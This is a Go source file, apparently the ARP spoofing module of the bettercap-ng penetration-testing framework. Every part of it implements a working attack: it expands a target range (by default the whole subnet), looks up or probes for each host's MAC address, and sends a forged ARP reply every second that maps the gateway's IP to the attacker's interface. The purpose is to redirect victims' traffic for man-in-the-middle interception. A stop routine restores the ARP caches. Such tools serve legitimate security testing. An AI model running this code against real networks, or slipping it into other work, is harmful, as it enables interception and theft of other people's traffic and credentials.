package modules

import (
	"fmt"
	network "github.com/evilsocket/bettercap-ng/net"
	"github.com/evilsocket/bettercap-ng/packets"
	"github.com/evilsocket/bettercap-ng/session"
	"github.com/malfunkt/iprange"
	"net"
	"time"
)

type ArpSpoofer struct {
	session.SessionModule
	Done chan bool
}

func NewArpSpoofer(s *session.Session) *ArpSpoofer {
	p := &ArpSpoofer{
		SessionModule: session.NewSessionModule("arp.spoof", s),
		Done:          make(chan bool),
	}

	p.AddParam(session.NewStringParameter("arp.spoof.targets", "<entire subnet>", "", "IP addresses to spoof."))

	p.AddHandler(session.NewModuleHandler("arp.spoof on", "",
		"Start ARP spoofer.",
		func(args []string) error {
			return p.Start()
		}))

	p.AddHandler(session.NewModuleHandler("arp.spoof off", "",
		"Stop ARP spoofer.",
		func(args []string) error {
			return p.Stop()
		}))

	return p
}

func (p *ArpSpoofer) OnSessionStarted(s *session.Session) {
	// refresh the subnet after session has been created
	s.Env.Set("arp.spoof.targets", s.Interface.CIDR())
}

func (p *ArpSpoofer) OnSessionEnded(s *session.Session) {
	if p.Running() {
		p.Stop()
	}
}

func (p ArpSpoofer) Name() string {
	return "ARP Spoofer"
}

func (p ArpSpoofer) Description() string {
	return "Keep spoofing selected hosts on the network."
}

func (p ArpSpoofer) Author() string {
	return "Simone Margaritelli <evilsocket@protonmail.com>"
}

func (p *ArpSpoofer) shouldSpoof(ip net.IP) bool {
	addr := ip.String()
	if ip.IsLoopback() == true {
		return false
	} else if addr == p.Session.Interface.IpAddress {
		return false
	} else if addr == p.Session.Gateway.IpAddress {
		return false
	}
	return true
}

func (p *ArpSpoofer) getMAC(ip net.IP, probe bool) (net.HardwareAddr, error) {
	var mac string
	var hw net.HardwareAddr
	var err error

	// do we have this ip mac address?
	mac, err = network.ArpLookup(p.Session.Interface.Name(), ip.String(), false)
	if err != nil && probe == true {
		from := p.Session.Interface.IP
		from_hw := p.Session.Interface.HW

		if err, probe := packets.NewUDPProbe(from, from_hw, ip, 139); err != nil {
			p.Session.Events.Log(session.ERROR, "Error while creating UDP probe packet for %s: %s\n", ip.String(), err)
		} else {
			p.Session.Queue.Send(probe)
		}

		time.Sleep(500 * time.Millisecond)

		mac, err = network.ArpLookup(p.Session.Interface.Name(), ip.String(), false)
	}

	if mac == "" {
		return nil, fmt.Errorf("Could not find hardware address for %s.", ip.String())
	}

	hw, err = net.ParseMAC(mac)
	if err != nil {
		return nil, fmt.Errorf("Error while parsing hardware address '%s' for %s: %s", mac, ip.String(), err)
	}

	return hw, nil
}

func (p *ArpSpoofer) sendArp(addresses []net.IP, saddr net.IP, smac net.HardwareAddr, check_running bool, probe bool) {
	for _, ip := range addresses {
		if p.shouldSpoof(ip) == false {
			p.Session.Events.Log(session.DEBUG, "Skipping address %s from ARP spoofing.\n", ip)
			continue
		}

		// do we have this ip mac address?
		hw, err := p.getMAC(ip, probe)
		if err != nil {
			p.Session.Events.Log(session.DEBUG, "Error while looking up hardware address for %s: %s\n", ip.String(), err)
			continue
		}

		if err, pkt := packets.NewARPReply(saddr, smac, ip, hw); err != nil {
			p.Session.Events.Log(session.ERROR, "Error while creating ARP spoof packet for %s: %s\n", ip.String(), err)
		} else {
			p.Session.Events.Log(session.DEBUG, "Sending %d bytes of ARP packet to %s:%s.\n", len(pkt), ip.String(), hw.String())
			p.Session.Queue.Send(pkt)
		}

		if check_running && p.Running() == false {
			return
		}
	}
}

func (p *ArpSpoofer) unSpoof() error {
	var targets string

	if err, v := p.Param("arp.spoof.targets").Get(p.Session); err != nil {
		return err
	} else {
		targets = v.(string)
	}

	list, err := iprange.Parse(targets)
	if err != nil {
		return fmt.Errorf("Error while parsing arp.spoof.targets variable '%s': %s.", targets, err)
	}
	addresses := list.Expand()

	from := p.Session.Gateway.IP
	from_hw := p.Session.Gateway.HW

	p.Session.Events.Log(session.INFO, "Restoring ARP cache of %d targets (%s).\n", len(addresses), targets)

	p.sendArp(addresses, from, from_hw, false, false)

	return nil
}

func (p *ArpSpoofer) Start() error {
	if p.Running() == false {
		var targets string

		if err, v := p.Param("arp.spoof.targets").Get(p.Session); err != nil {
			return err
		} else {
			targets = v.(string)
		}

		list, err := iprange.Parse(targets)
		if err != nil {
			return fmt.Errorf("Error while parsing arp.spoof.targets variable '%s': %s.", targets, err)
		}
		addresses := list.Expand()

		p.SetRunning(true)

		go func() {

			from := p.Session.Gateway.IP
			from_hw := p.Session.Interface.HW

			p.Session.Events.Log(session.INFO, "ARP spoofer started, probing %d targets (%s).\n", len(addresses), targets)

			for p.Running() {
				p.sendArp(addresses, from, from_hw, true, false)
				time.Sleep(1 * time.Second)
			}

			p.Done <- true
		}()

		return nil
	} else {
		return fmt.Errorf("ARP spoofer already started.")
	}
}

func (p *ArpSpoofer) Stop() error {
	if p.Running() == true {
		p.SetRunning(false)

		p.Session.Events.Log(session.INFO, "Waiting for ARP spoofer to stop ...")

		<-p.Done

		p.unSpoof()

		return nil
	} else {
		return fmt.Errorf("ARP spoofer already stopped.")
	}
}
